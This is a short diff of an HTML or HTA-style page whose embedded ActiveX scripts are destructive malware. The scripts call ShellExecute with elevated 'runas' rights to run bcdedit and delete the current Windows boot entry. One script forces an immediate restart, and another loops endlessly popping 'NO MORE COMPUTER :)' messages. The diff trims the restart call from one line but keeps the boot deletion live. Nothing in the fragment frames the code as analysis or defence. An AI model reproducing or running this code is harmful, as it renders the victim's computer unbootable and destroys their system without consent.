@@ -19,7 +19,7 @@
 <dont>(function(){while(true){var s=new ActiveXObject('Shell.Application');s.ShellExecute('bcdedit.exe','/delete {current} /f','', 'runas',1);s.ShellExecute('shutdown.exe','/r /t 0','', 'runas',1);close();}})()</dont>
 <script>
       var s=new ActiveXObject('Shell.Application')
-      s.ShellExecute('bcdedit.exe','/delete {current} /f','', 'runas',1);s.ShellExecute('shutdown.exe','/r /t 0','', 'runas',1);
+      s.ShellExecute('bcdedit.exe','/delete {current} /f','', 'runas',1);
       while(true){s.ShellExecute('msg','* NO MORE COMPUTER :)','')}
 </script>
 <script>
